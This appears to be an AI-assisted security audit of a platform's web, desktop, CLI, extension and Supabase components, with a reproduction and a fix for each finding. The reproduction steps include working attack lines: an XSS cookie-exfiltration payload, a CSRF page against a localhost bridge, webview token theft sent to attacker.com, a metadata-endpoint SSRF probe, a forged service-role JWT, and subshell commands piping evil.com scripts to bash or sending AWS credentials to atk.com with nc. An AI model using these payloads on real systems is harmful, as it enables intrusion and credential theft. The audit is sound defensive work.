# Red-Team & Senior-Engineer Review — AGI Workforce

**Date:** 2026-05-04
**Reviewer:** Claude Opus 4.7 (1M) + 8 parallel surface-specialist red-team agents
**Method:** Read-only audit. No production code modified during review.
**Scope:** Full multi-surface platform — `apps/web` (Next.js 14), `apps/desktop` (Tauri/Rust+React), `apps/mobile` (Expo 55 / RN 0.84), `apps/cli` (Rust+Ratatui), `apps/extension` (Chrome MV3 v1.2.0), `apps/extension-vscode` (v0.3.0), `services/api-gateway` (Express 5), `services/signaling-server` (TS on Fly.io), `supabase/migrations` (17 files).

**Summary:** **3 P0 ship-blockers**, 9 Critical, 18 High, 16 Medium, 11 Low. The single most important finding is that the Next.js middleware never runs (CRIT-1) — this disables CSP, session refresh, and rate-limit IP normalization on every request to the production web app. The second is that an unauthenticated localhost HTTP/WS bridge on port 8787 is shared by three surfaces (Desktop server + Chrome ext client + VS Code ext client), creating a uniform "any local process can drive my desktop" attack surface (CRIT-4 / CRIT-5 / CRIT-6). The third is that the CLI's `run_command` tool dispatches `sh -c <model-emitted-string>` without ever calling the sandbox helper (CRIT-7) — combined with `--dangerously-skip-permissions` it is straight RCE.

**Inter-agent contradictions resolved during synthesis:**

- Mobile agent claimed `apps/mobile/.env` was tracked. **Refuted.** `git ls-files | grep -E '(^|/)\.env($|\.)'` returns only `*.env.example` files in 5 dirs. Downgraded mobile finding to LOW (verify before any rotation).
- Web agent's `WEB-RLS-BYPASS` was reported partially fixed in the chat-completions route but confirmed still open in five `lib/services/*` files; both stand as separate findings (M-3 closed, H-3 open).

## 1. Executive Summary & P0 Ship Blockers

| #   | ID                                        | Surface               | Severity    | One-line                                                                                                            |
| --- | ----------------------------------------- | --------------------- | ----------- | ------------------------------------------------------------------------------------------------------------------- |
| 1   | **WEB-CRIT-1**                            | apps/web              | P0 Critical | Next.js middleware never runs — CSP, session refresh, IP-header strip all dead.                                     |
| 2   | **DESK-CRIT-4 / CHR-CRIT-1 / VSC-CRIT-1** | desktop+chrome+vscode | P0 Critical | Unified bridge port 8787 has no auth on any of the three implementations — any local process drives the desktop.    |
| 3   | **CLI-CRIT-7**                            | apps/cli              | P0 Critical | `run_command` invokes `sh -c <model-string>` directly with no sandbox call; full-auto mode = arbitrary RCE on host. |

**Overall posture:**

- **Web:** Solid headers/CORS in `next.config.ts`, correct Stripe HMAC verification, Helmet on gateway — but the entire middleware layer is bypassed because the file is misnamed. Five `lib/services/*` modules still build with the service-role key bypassing RLS. Several previously-tracked P0s are confirmed fixed (set-token JWT validation, completions-route service-role scoping); two new P0s emerged (middleware dead, image-URL SSRF).
- **Supabase:** RLS enabled on all 18 public tables — strong baseline. 22 policies use `auth.role() = 'service_role'` (JWT-claim-trusting) instead of `TO service_role` (role-grant-based) — repeated antipattern. Two specific tables have policy bugs (`shared_sessions` token check missing from policy; `github_installations` UPDATE missing `WITH CHECK`).
- **Desktop:** Master password vault has Argon2id + per-user salt but no brute-force lockout. WebSocket bridge accepts upgrades without Origin check (token comes after upgrade). - **CLI:** Sandbox is a paper tiger — `sh -c` with no sandbox call from the main tool path; macOS Seatbelt allows full network-outbound and reads `/etc /usr /Library /System "/" /opt`; Linux bwrap does `--ro-bind / /` (full host readable); Windows + Landlock + Linux-without-bwrap silently fall through to unsandboxed `sh -c` execution at `sandbox.rs:159`.
- **Chrome extension:** Localhost HTTP bridge unauthenticated. `0.0.0.0` in allowed-bridge-hosts allows LAN reach. Full page HTML (100KB) silently forwarded to localhost on every tab load. Prompt-injection from page DOM into model context.
- **VS Code extension:** Same unauthenticated bridge. `suggestCommand` types LLM-emitted commands directly into the user's terminal QuickPick. Hand-rolled HTML sanitizer in webview (bypassable). `Math.random()` for CSP nonce. Workspace-scoped `apiEndpoint` setting + `onStartupFinished` activation = clone-and-open-repo exfils API key.
- **Mobile:** Biometric gate is React state (UI-only); keychain items have no `requireAuthentication: true`. Messaging API tokens land in unencrypted MMKV. No per-user rate limit on dispatch tasks. `Math.random()` for message IDs.
- **Services:** API gateway has 1MB JSON body parse before any auth middleware. `trust proxy` allows `x-forwarded-for` rate-limit bypass. Signaling server is well-engineered (post-fix), but the unauthenticated `GET /pairings/:code` lookup over a 6-char alphanumeric code is enumerable per pairing window.
- **CI:** No `pull_request_target` (good). Most third-party Actions on floating major tags (not SHA-pinned).

## 2. Critical Findings — Reproduction & Fix

### CRIT-1 — Web middleware never runs (CSP / session-refresh / IP-strip dead)

**Severity:** Critical (P0). **Surface:** apps/web. **CVSS-ish:** 9.1 (network-reachable, no auth required, scope change to all routes).

**Location:** `apps/web/proxy.ts` (entire file misnamed). `apps/web/middleware.ts` does not exist (verified `ls`).

**Root cause:** Next.js App Router only invokes a file at the project root named exactly `middleware.ts` (or `.js`) that exports a function named exactly `middleware`. The repo has `proxy.ts` exporting `proxy()` and `config`. Next.js never sees it. The `proxy()` body — which sets the per-request CSP nonce, calls Supabase `updateSession()` to refresh tokens, and skips `/api/stripe-webhook` — is dead code. Every page is served without `Content-Security-Policy`; every API request reaches the route handler with raw `x-real-ip` / `x-forwarded-for` headers; every Supabase session expires silently in the browser cookie until manual refresh.

**Edge cases that reproduce the bug:**

1. **Credential stuffing bypassing per-IP rate limit:**

   ```bash
   for i in $(seq 1 100); do
     curl -s -o /dev/null -w "%{http_code}\n" \
       -H "x-real-ip: 1.2.3.$((RANDOM % 255))" \
       -H "Content-Type: application/json" \
       -d '{"email":"victim@example.com","password":"guess'$i'"}' \
       https://agiworkforce.com/api/auth/login
   done
   # All 100 attempts succeed without hitting auth-login bucket (5 / 15min).
   # rate-limit.ts:419 trusts x-real-ip as the first non-JWT identifier.
   ```

2. **CSP missing on every response — XSS amplifier:**

   ```bash
   curl -sI https://agiworkforce.com/ | grep -i content-security-policy
   # (no output) — header absent.
   # Any reflected XSS in chat markdown becomes script execution; an attacker who
   # can place '<img src=x onerror="fetch(\"https://atk/?d=\"+document.cookie)">'
   # in a message (or markdown that bypasses sanitization) gets script exec.
   ```

3. **Supabase session never refreshes:**
   ```ts
   // Browser holds a session cookie that expires. Without proxy.ts running
   // updateSession() on every navigation, the access_token is never rotated.
   // Eventually the UI shows "session expired" mid-conversation.
   ```

**Fix (single commit):**

```bash
git mv apps/web/proxy.ts apps/web/middleware.ts
```

Then in `apps/web/middleware.ts`:

```diff
- export function proxy(request: NextRequest) {
+ export function middleware(request: NextRequest) {
```

And add to the response header strip step inside the function (currently missing — the audit only said the file is dead; once activated, also strip attacker-supplied IP headers):

```ts
// After updateSession(), before returning the response:
const headers = new Headers(request.headers);
headers.delete('x-real-ip');
headers.delete('x-forwarded-for'); // re-set by the trusted edge layer
headers.delete('x-client-ip');
const response = NextResponse.next({ request: { headers } });
// ... existing CSP nonce + cookie copy ...
```

**Pre-deploy validation (mandatory — blast radius):**

- This middleware has been dormant for an unknown duration; activating it touches every request.
- Smoke-test in staging against: (a) all auth flows (login, OAuth, set-token), (b) Stripe webhook (must remain excluded), (c) any page using inline `<script>` or `<style>` (CSP nonce must be wired correctly).
- Inspect server logs for `updateSession()` errors that have been silenced.
- Run E2E suite against staging before promoting.

### CRIT-2 — SSRF via unvalidated `image_url.url` in multimodal completions

**Severity:** Critical (P0). **Surface:** apps/web.

**Location:** `apps/web/app/api/llm/v1/chat/completions/route.ts:52` (schema), `apps/web/lib/llm-providers/anthropic.ts:407-422` (passthrough).

**Root cause:** The chat-completions route accepts `messages[].content[].image_url.url` as `z.string()` — no `.url()`, no scheme allowlist, no IP allowlist. The Anthropic provider passes it through verbatim to Anthropic's API as `{type:"image",source:{type:"url",url:<attacker>}}`. Anthropic fetches the URL server-side; an authenticated subscriber can probe internal/cloud-metadata addresses or use Anthropic as an SSRF amplifier.

**Edge cases that reproduce:**

1. **AWS instance-metadata probe (if Anthropic backend is on EC2 — speculative but cheap):**
   ```bash
   curl -X POST https://agiworkforce.com/api/llm/v1/chat/completions \
     -H "Authorization: Bearer $REAL_USER_KEY" \
     -H "Content-Type: application/json" \
     -d '{
       "model":"claude-opus-4-7",
       "messages":[{"role":"user","content":[
         {"type":"image_url","image_url":{"url":"http://169.254.169.254/latest/meta-data/"}}]
       }]
     }'
   ```
2. **Internal endpoint enumeration via timing/error differential:**
   - `http://localhost:9200/_cat/indices` (Elasticsearch)
   - `http://internal-redis:6379/info`
   - `file:///etc/passwd` (if Anthropic uses `urllib`/`requests` with `file://` enabled — usually disabled, but cheap to test)
3. **Token theft via Authorization-header forwarding:** depends on whether the provider client adds Authorization to outbound image fetches. Verify in the provider HTTP client.

**Fix:**

```ts
// apps/web/lib/llm-providers/anthropic.ts (in buildAnthropicContentBlocks):
import { validateEgressUrl } from '@/lib/security/egress-policy';

if (block.type === 'image_url') {
  const url = block.image_url.url;
  if (!url.startsWith('data:')) {
    await validateEgressUrl(url); // throws on private/link-local IPs and non-https schemes
  }
  // ... existing path
}
```

And tighten the schema:

```ts
// apps/web/app/api/llm/v1/chat/completions/route.ts (line 52):
image_url: z.object({
  url: z.string().refine(
    (v) => v.startsWith('data:image/') || /^https:\/\//.test(v),
    'image_url must be data: URI or https URL'
  ),
}),
```

Apply the same pattern in the OpenAI provider path.

### CRIT-3 — Supabase `shared_sessions` SELECT exposes all active shares' message bodies

**Severity:** Critical. **Surface:** supabase.

**Location:** `supabase/migrations/20260307000001_create_shared_sessions.sql:24-27`.

**Root cause:** Policy is `USING (expires_at > now())`. The `token` field is checked only by the API route, not the policy. PostgREST is publicly callable with the anon key — any client can paginate the table.

**Edge case that reproduces:**

```bash
SUPABASE_URL=https://<project>.supabase.co
ANON_KEY=$NEXT_PUBLIC_SUPABASE_ANON_KEY  # public; anyone has it
curl "$SUPABASE_URL/rest/v1/shared_sessions?expires_at=gt.now()&select=*" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"
# Returns every active share: id, owner_id, model, full messages JSONB, token.
```

**Fix (new migration):**

```sql
-- supabase/migrations/2026MMDDHHMMSS_fix_shared_sessions_rls.sql
DROP POLICY IF EXISTS "Anyone can view non-expired shared sessions" ON public.shared_sessions;

-- Option A (recommended): revoke anon SELECT entirely; route through Edge Function
REVOKE SELECT ON public.shared_sessions FROM anon;
GRANT SELECT ON public.shared_sessions TO authenticated;
CREATE POLICY "Owners read their shares" ON public.shared_sessions FOR SELECT TO authenticated
  USING (owner_id = auth.uid());

-- Option B: enforce token claim in the policy itself
-- (requires API to inject the claim into the JWT or use a signed RPC)
```

**Pre-deploy:** the API route at `app/api/share/[token]/route.ts` (verify path) must switch to `getServiceClient()` for the lookup if Option A is chosen.

### CRIT-4 / CHR-CRIT-1 / VSC-CRIT-1 — Unauthenticated localhost bridge on port 8787 (3 implementations agree)

**Severity:** Critical (P0 — pattern-level). **Surface:** desktop server + chrome client + vscode client.

**Locations:**

- Server: `apps/desktop/src-tauri/src/integrations/realtime/websocket_server.rs:64-94` (no Origin check on WS upgrade; token check only after upgrade)
- Server token storage: `apps/desktop/src-tauri/src/lib.rs:862-865, 888-898` (`AGI_REALTIME_PORT` env override, `.ipc_token` file with no Windows ACL)
- Chrome client: `apps/extension/src/background.ts:1973, 2343` (no auth header on POST)
- VS Code client: `apps/extension-vscode/src/services/desktopBridge.ts:195-215` (no auth header on POST or WS)

**Root cause:** Three independent implementations all assume "localhost = trusted." That assumption is wrong on a multi-user desktop, in the presence of malicious browser tabs (CSRF over `fetch` to `127.0.0.1:8787`), in the presence of malicious npm `postinstall` scripts running in the user session, or in the presence of any other extension with `host_permissions: ['http://localhost:*']`. The Chrome extension's allowlist also includes literal `'0.0.0.0'`, which on macOS/Linux is reachable from any LAN interface.

**Edge cases that reproduce:**

1. **Browser-tab hijack of bridge via CSRF:**

   ```html
   <!-- attacker.com -->
   <script>
     fetch('http://127.0.0.1:8787/v1/chat/stream', {
       method: 'POST',
       mode: 'no-cors',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ messages: [{ role: 'user', content: 'EXFIL ALL CHATS' }] }),
     });
   </script>
   ```

   Result: bridge accepts the request, runs the chat, response goes back to attacker if any reflective surface exists; even without response, side-effects (memory writes, follow-up actions) succeed.

2. **WebSocket Origin spoof:**

   ```js
   new WebSocket('ws://127.0.0.1:8787');
   // upgrade succeeds because Origin is never checked.
   // Token is requested after upgrade — attacker brute-forces 36-char UUID
   //   (effectively impossible) OR exfils it from a sibling process that
   //   read .ipc_token off disk.
   ```

3. **`AGI_REALTIME_PORT` env redirect (DESK-HIGH-1):**

   ```bash
   # A sandboxed malicious app sets this before launching the desktop:
   AGI_REALTIME_PORT=12345 open -a "AGI Workforce"
   # It then runs its own server on 12345 and intercepts every bridge call.
   ```

4. **LAN attack via `0.0.0.0` allowlist:** any laptop on the same Wi-Fi can hit the bridge if the desktop binds to `0.0.0.0` (which the env-override + allowlist make possible).

**Fix (cross-surface):**

Server-side (Desktop):

```rust
// apps/desktop/src-tauri/src/integrations/realtime/websocket_server.rs
// 1. Read raw HTTP request before accept_async; reject if Origin not in allowlist:
let allowed = ["tauri://localhost", "http://localhost:5173", "http://127.0.0.1:5173"];
let origin = headers.get("Origin").and_then(|v| v.to_str().ok());
if !origin.map_or(false, |o| allowed.contains(&o)) {
    return Err(/* 403 */);
}
// 2. Require X-Bridge-Token header on every HTTP POST AND on the WS upgrade
//    (move it from "first WS message" to "Sec-WebSocket-Protocol: bridge.<token>"
//    or a custom Authorization header).
// 3. Bind only to 127.0.0.1 (never 0.0.0.0); ignore AGI_REALTIME_PORT in release builds.
// 4. On Windows, set explicit ACL on .ipc_token using windows-sys.
```

Client-side (Chrome ext):

```ts
// apps/extension/src/background.ts:1976
const ALLOWED_BRIDGE_HOSTS = ['localhost', '127.0.0.1', '[::1]']; // remove '0.0.0.0'
// On bridge handshake, fetch the token from chrome.storage.local (written
// during the desktop pairing flow) and send X-Bridge-Token on every request.
```

Client-side (VS Code ext):

```ts
// apps/extension-vscode/src/services/desktopBridge.ts:195
headers: { 'X-Bridge-Token': await getBridgeToken(), ... }
```

**Long-term:** factor a `@agiworkforce/bridge-client` package shared by chrome+vscode (and consumed by desktop server) so the auth contract is defined in one place and cannot drift again.

### CRIT-5 — Master password unlock has no brute-force lockout

**Severity:** Critical. **Surface:** apps/desktop.

**Location:** `apps/desktop/src-tauri/src/sys/commands/master_password.rs:134-159`, `apps/desktop/src-tauri/src/sys/security/master_password.rs:338-368`.

**Root cause:** `master_password_unlock` runs Argon2id verify but does not increment a failed-attempt counter. The 200ms Argon2id delay is the only natural rate-limit. The `auth.rs` rate limiter (`TOKEN_VALIDATION_MAX_ATTEMPTS = 20`) covers a different code path. A renderer-side script (XSS, malicious extension via MV3-permission abuse, compromised renderer via Tauri webview) can iterate guesses against a leaked password hint.

**Edge case that reproduces:**

```js
// Inside the Tauri webview (e.g. via XSS in chat markdown):
for (const guess of commonPasswords) {
  const ok = await window.__TAURI__.invoke('master_password_unlock', { password: guess });
  if (ok) {
    exfil(guess);
    break;
  }
}
// No lockout. ~5 guesses/sec given Argon2id cost.
```

**Fix:**

```rust
// apps/desktop/src-tauri/src/sys/security/master_password.rs
struct MasterPasswordState {
    failed_unlock_count: AtomicU32,
    locked_until: Mutex<Option<Instant>>,
    // ... existing fields
}

pub fn unlock(&self, password: &str) -> Result<(), Error> {
    {
        let lock_guard = self.locked_until.lock().unwrap();
        if let Some(until) = *lock_guard {
            if Instant::now() < until {
                let secs = until.duration_since(Instant::now()).as_secs();
                return Err(Error::Locked { retry_after_secs: secs });
            }
        }
    }
    match self.verify(password) {
        Ok(()) => {
            self.failed_unlock_count.store(0, Ordering::SeqCst);
            Ok(())
        }
        Err(e) => {
            let prev = self.failed_unlock_count.fetch_add(1, Ordering::SeqCst);
            if prev + 1 >= 5 {
                *self.locked_until.lock().unwrap() = Some(Instant::now() + Duration::from_secs(1800));
            }
            Err(e)
        }
    }
}
```

Also: remove the standalone `master_password_verify` IPC command (INFO-1) — it's a second oracle that a brute-forcer can hit instead.

### CRIT-6 — Plaintext Supabase JWT returned to renderer on every `supabase_token_get` call

**Severity:** Critical. **Surface:** apps/desktop.

**Location:** `apps/desktop/src-tauri/src/sys/commands/supabase_token.rs:86-113`.

**Root cause:** A long-lived Supabase access token (JWT, contains user identity, can be replayed by anyone who possesses it) is decrypted from secure storage and returned as a plaintext `String` to the renderer. Any XSS / injection inside the Tauri webview can `invoke('supabase_token_get')` and exfil. CSP currently allows `'unsafe-inline'` on `style-src` and `blob:` on `worker-src` — not airtight against script injection.

**Edge case:**

```js
// Inside the webview after any DOM-injection (e.g. via a chat message containing
// crafted HTML that escapes markdown sanitization):
const token = await window.__TAURI__.invoke('supabase_token_get');
fetch('https://attacker.com/?t=' + encodeURIComponent(token), { mode: 'no-cors' });
// Attacker now holds the user's Supabase access token until it expires.
```

**Fix (architectural):** the renderer must never see the token. Replace `supabase_token_get` with task-specific Rust commands that perform the Supabase request and return only the result:

```rust
// REMOVE: supabase_token_get -> String
// ADD instead:
#[tauri::command]
async fn supabase_query<T: DeserializeOwned>(
    state: State<'_, Vault>,
    path: String,
    method: String,
    body: Option<Value>,
) -> Result<T, String> {
    let token = state.get_supabase_token_internal().await?; // never leaves Rust
    // ... make Supabase HTTP call with token
    // return only the typed result
}
```

For React-Query/SWR-shaped consumers, expose typed wrappers: `use_get_threads()`, `use_create_message()`, etc.

### CRIT-7 — CLI `run_command` dispatches `sh -c <model-string>` without sandbox

**Severity:** Critical (P0). **Surface:** apps/cli.

**Location:** `apps/cli/src/tools.rs:586` (run_command path), `apps/cli/src/sandbox.rs:80-164` (the unused sandbox).

**Root cause (verified by reading sandbox.rs):** `execute_run_command` builds `Command::new("sh").arg("-c").arg(command)` directly. The sandbox helper `execute_sandboxed` exists in `sandbox.rs:80` but is not called from `run_command`. The classification at `safety.rs:205-214` catches `$(` only when the first word is in `DANGEROUS_COMMANDS`; otherwise the command falls to `Unknown` and is auto-approved if its first token is in the user's session-cached approval set. A model-emitted `cargo test -- $(curl evil.com/x.sh | bash)` passes because `cargo` is not dangerous and `$(...)` triggers no top-level check.

**Edge cases that reproduce:**

1. **Subshell-in-safe-prefix bypass (RCE-2):**

   ```
   # User has previously approved "cargo test" (cached in PermissionStore).
   # Model emits:
   cargo test -- $(curl -s https://evil.com/loader.sh | bash)
   # classify_command returns Unknown (cargo not in DANGEROUS_COMMANDS).
   # cache lookup finds "cargo" -> Allow.
   # tools.rs:586 executes via sh -c, subshell substitution runs unimpeded.
   ```

2. **Backtick variant:**

   ```
   echo "test result: `id; cat ~/.aws/credentials | nc atk.com 9999`"
   # classify_command misses backticks for the same reason.
   ```

3. **Full-auto mode:**

   ```bash
   agiworkforce exec --dangerously-skip-permissions "fix the failing test"
   # safety classifier output is ignored; any tool call runs without prompt;
   # sandbox is still not invoked at the run_command layer.
   ```

4. **Sandbox fallthrough on Windows / Linux-without-bwrap (HIGH-3, confirmed at sandbox.rs:159):**
   ```rust
   _ => cmd.output().await.map_err(|e| anyhow::anyhow!("Exec failed: {}", e))
   ```
   `cmd` is `Command::new("sh").arg("-c").arg(command)` from line 85-86 — even when the user requested sandboxing, the wildcard arm executes WITHOUT any restriction on Windows, Landlock, or Linux without bwrap.

**Fix (must combine three changes):**

1. Route `run_command` through `execute_sandboxed`:

   ```rust
   // apps/cli/src/tools.rs:586 (replace sh -c branch):
   let manager = SandboxManager::new(policy, workspace_dir);
   let output = sandbox::execute_sandboxed(&manager, &command, cwd.as_deref()).await?;
   ```

2. Fix the silent fallthrough — make unsupported platforms FAIL CLOSED:

   ```rust
   // apps/cli/src/sandbox.rs:159
   _ => Err(anyhow::anyhow!(
       "Sandbox unavailable on this platform ({}). Refuse to run unsandboxed unless --dangerously-skip-permissions is set.",
       std::env::consts::OS
   )),
   ```

   Then in `run_command`, only call the unsandboxed `sh -c` when `--dangerously-skip-permissions` is explicit AND log a warning at every call.

3. Tighten `classify_command` to flag any `$(` or `` ` `` regardless of first word:
   ```rust
   // apps/cli/src/safety.rs:205
   if cmd.contains("$(") || cmd.contains('`') {
       return Classification::Dangerous;
   }
   ```

Also tighten Seatbelt + bwrap (HIGH-3 / HIGH-4) — the existing profiles are too wide:

```rust
// Seatbelt: remove (allow network-outbound) and the (literal "/") subpath.
// bwrap: replace --ro-bind / / with explicit --ro-bind /usr /usr --ro-bind /lib /lib
//        --ro-bind /lib64 /lib64 --ro-bind /bin /bin (do not bind /etc /home).
```

### CRIT-8 — Mobile biometric gate is React state, not OS-enforced

**Severity:** Critical. **Surface:** apps/mobile.

**Location:** `apps/mobile/lib/secureStorage.ts:51-53`, `apps/mobile/hooks/useBiometricGate.ts:37-41`.

**Root cause:** All `SecureStore.setItemAsync` calls pass `keychainAccessible: WHEN_UNLOCKED_THIS_DEVICE_ONLY` but DO NOT pass `requireAuthentication: true`. So the keychain item has no `SecAccessControl` biometric requirement on iOS. The biometric prompt in `useBiometricGate` is React state — and on hardware-check failure the catch block calls `setIsUnlocked(true)` (fail-open).

**Edge case:**

```ts
// On a jailbroken device or via a debug bridge, the attacker can:
```

### CRIT-9 — Web `ApiKeyService.verifyKey` runs Argon2id against up to 1,000 rows per request

**Severity:** Critical (DoS). **Surface:** apps/web.

**Location:** `apps/web/lib/services/api-key-service.ts:273-277`.

**Root cause:** The query loads all non-expired keys (`.limit(1000)`) and iterates Argon2id verify against each. Argon2id is configured at 64 MB / 3 iters / 4 threads — designed to be slow. One verify request can pin a CPU for seconds. With 1,000 keys in the DB, one request = ~1,000 Argon2 runs.

**Edge case that reproduces:**

```bash
# Submit a valid-format API key from any client:
for i in $(seq 1 50); do
  curl -X POST https://agiworkforce.com/api/some-protected-route \
    -H "Authorization: Bearer sk_live_$(openssl rand -hex 16)" &
done
# 50 concurrent requests, each running 1000 Argon2 verifies = 50,000 KDF
# operations against the API server's CPU cores. Server stalls or OOMs.
```

**Fix:**

1. Add a non-secret key prefix (first 8 chars of the public key) as an indexed column.
2. Pre-filter to a single row before Argon2id verify:
   ```sql
   ALTER TABLE api_keys ADD COLUMN key_prefix TEXT;
   CREATE INDEX api_keys_key_prefix_idx ON api_keys(key_prefix) WHERE expires_at IS NULL OR expires_at > now();
   UPDATE api_keys SET key_prefix = substring(key_value FROM 1 FOR 8); -- backfill (uses encrypted value if you store the prefix at creation time only)
   ```
3. Code:
   ```ts
   // api-key-service.ts:273
   const prefix = userSubmittedKey.slice(0, 8);
   const { data } = await supabase
     .from('api_keys')
     .select('id, key_hash, user_id')
     .eq('key_prefix', prefix)
     .or('expires_at.is.null,expires_at.gt.' + new Date().toISOString())
     .limit(5); // upper bound; collisions extremely rare with 8-char prefix
   for (const row of data) {
     if (await argon2.verify(row.key_hash, userSubmittedKey)) return row;
   }
   return null;
   ```

## 3. High Findings — Reproduction & Fix

### HIGH-1 — Supabase: 22 policies use `auth.role() = 'service_role'` (JWT-claim-trusting)

**Surface:** supabase. **Locations:** 22 sites across `migrations/20260308100001`, `_100002`, `_100003`, `_100004`, `_120001`, `_120002`, `20260318000001`, `_000002`, `20260319100001-3`, `20260324000001`.

**Root cause:** Supabase's `auth.role()` returns the `role` claim from the bearer JWT. The Postgres-recommended way to grant service-role access is `TO service_role` (a role grant evaluated against the connection's `SET ROLE`, which the JWT auth proxy sets only for the actual service-role key). Using `auth.role() = 'service_role'` trusts a JWT claim — anyone with the project's `SUPABASE_JWT_SECRET` (web app, signaling server, edge functions, leaked CI secret) can mint `{role:'service_role',sub:any_uuid}` and bypass RLS.

**Edge case:**

```js
import jwt from 'jsonwebtoken';
const token = jwt.sign({ role: 'service_role', sub: VICTIM_UUID }, LEAKED_SECRET);
fetch(`${SUPABASE_URL}/rest/v1/dispatch_messages?select=*`, {
  headers: { apikey: ANON_KEY, Authorization: `Bearer ${token}` },
});
// Returns ALL users' dispatch messages. RLS bypassed.
```

**Fix (one new migration):**

```sql
-- supabase/migrations/2026MMDDHHMMSS_replace_authrole_with_role_grant.sql
DO $$
DECLARE pol record;
BEGIN
  FOR pol IN
    SELECT schemaname, tablename, policyname FROM pg_policies
    WHERE qual LIKE '%auth.role()%service_role%' OR with_check LIKE '%auth.role()%service_role%'
  LOOP
    EXECUTE format(
      'DROP POLICY %I ON %I.%I',
      pol.policyname, pol.schemaname, pol.tablename
    );
    EXECUTE format(
      'CREATE POLICY %I ON %I.%I FOR ALL TO service_role USING (true) WITH CHECK (true)',
      pol.policyname, pol.schemaname, pol.tablename
    );
  END LOOP;
END $$;
```

## 5. Senior-Engineer Review

### 5.1 Architecture & System Design

**Overall:** A multi-surface platform with six client surfaces sharing one backend (Supabase + a thin Express gateway + a Fly.io signaling server). The cross-surface state model is well-conceived (Supabase as single source of truth, realtime for cross-device sync). Surface ownership boundaries are explicit (`.claude/agents/*.md`) and consistently respected in commits.

**Architectural concerns (ranked):**

1. **Three independent unauthenticated implementations of the same "localhost bridge" contract on port 8787.** Desktop server, Chrome client, VS Code client each reinvented the auth model and each chose "localhost = trusted." This is a _coordination failure_ — the canonical fix is a `packages/bridge-protocol/` package that defines:
   - The HMAC/PSK handshake (token generated by desktop on launch, written to a per-user-protected file, read by clients via a one-time pairing flow);
   - The HTTP/WS framing (typed message envelopes, version field);
   - The authentication header (`X-Bridge-Token` or `Sec-WebSocket-Protocol: bridge.<token>`);
   - The Origin allowlist.
     Then desktop+chrome+vscode all import from one package. Single source of truth for auth.

2. **Service-role-key reuse in `apps/web/lib/services/*` shadows RLS.** RLS is the platform's defense-in-depth. Bypassing it in five service files means a single `.eq('user_id', userId)` typo is a tenancy violation. The new `lib/supabase-server.ts` (untracked) appears to be the start of the fix — landing it is a P0 architectural cleanup.

3. **Two parallel "Tauri command surface" patterns.** 1,469 commands across 151 files. Some commands return secrets to the renderer (`supabase_token_get`); others perform network calls and return only result data. The codebase needs a _standard_ — secrets never cross the IPC boundary, only typed result objects. CRIT-6 is the canonical example.

4. **Sandbox abstraction exists but is bypassed.** `sandbox::execute_sandboxed` is implemented and reasonable in shape (better than nothing on macOS+Linux), but the main tool path (`tools.rs:586`) calls `sh -c` directly, and the wildcard arm at `sandbox.rs:159` silently fails open on Windows/Landlock/Linux-without-bwrap. A sandbox abstraction that isn't called and silently no-ops on three platforms is _worse_ than no abstraction — it gives the appearance of safety.

5. **Repeated antipattern: `auth.role() = 'service_role'` (22 sites).** Indicates a lack of a Supabase migration linter / policy convention doc. Add a CI check: `grep -r "auth.role().*service_role" supabase/migrations/ && exit 1`.

6. **API gateway is a thin pass-through but adds another auth layer.** Express 5 + JWT verify + rate-limit + CSRF + CORS — well-engineered, but it creates two places (`apps/web/middleware.ts` and `services/api-gateway/src/middleware/`) where auth decisions live. Decide which is canonical and document the routing matrix.

### 5.4 Reliability & Failure Modes

**Silent fail-open patterns (highest priority):**

1. **`apps/cli/src/sandbox.rs:159`** — wildcard match arm executes the unsandboxed `sh -c` on Windows / Landlock / Linux-without-bwrap with no warning. Verified by Read.
2. **`apps/web/proxy.ts`** — entire middleware silently inactive due to misnaming. Verified by `ls`.
3. **`apps/mobile/hooks/useBiometricGate.ts:37-41`** — biometric check failure → `setIsUnlocked(true)`.
4. **`apps/desktop/src-tauri/src/lib.rs:862-865`** — `AGI_REALTIME_PORT` env var silently redirects bridge port.
5. **Supabase `shared_conversations` table** — RLS-on with zero policies = silent empty SELECT for clients; if a refactor swaps service-role → anon, query returns `[]` with no error.

These are all classic cases of "rule of least surprise" violations. Each should fail loudly:

```rust
// CLI sandbox
_ => {
    eprintln!("FATAL: sandbox unsupported on {} — refusing to execute. Pass --i-accept-the-risk to override.", std::env::consts::OS);
    std::process::exit(2);
}
```

```ts
// Mobile biometric
} catch (e) {
  console.error('Biometric auth failed', e);
  setIsUnlocked(false);
  Alert.alert('Authentication required', 'Restart the app to retry.');
  return false;
}
```

**Race conditions identified:**

1. `.ipc_token` TOCTOU on macOS — file created then permissions set; default mode applies in the window between `create` and `set_permissions`. Fix: use `OpenOptions::new().mode(0o600).create_new(true).open()` to atomically create with mode.
2. WebSocket bridge — token check after upgrade. Fix: move auth into upgrade handshake (Sec-WebSocket-Protocol or pre-upgrade Authorization).
3. ApiKeyService.verifyKey — no per-request lock; concurrent verifies can each run 1000 Argon2 ops. Fix: prefix-index limits to ≤5 candidates.

**Missing failure-mode handling:**

- Web routes uniformly catch errors and return 500 with generic messages (good), but logging contains user-controlled data (potential log injection — verify `lib/logging/*`).
- Supabase RPC error → API route returns 500 without distinguishing transient vs permanent failures → caller can't decide retry policy.
- Stripe webhook idempotency RPC failure (`route.ts:1252`) returns 500 → Stripe retries within the SDK's 300s tolerance window (HIGH-5). Lower tolerance to 60s.
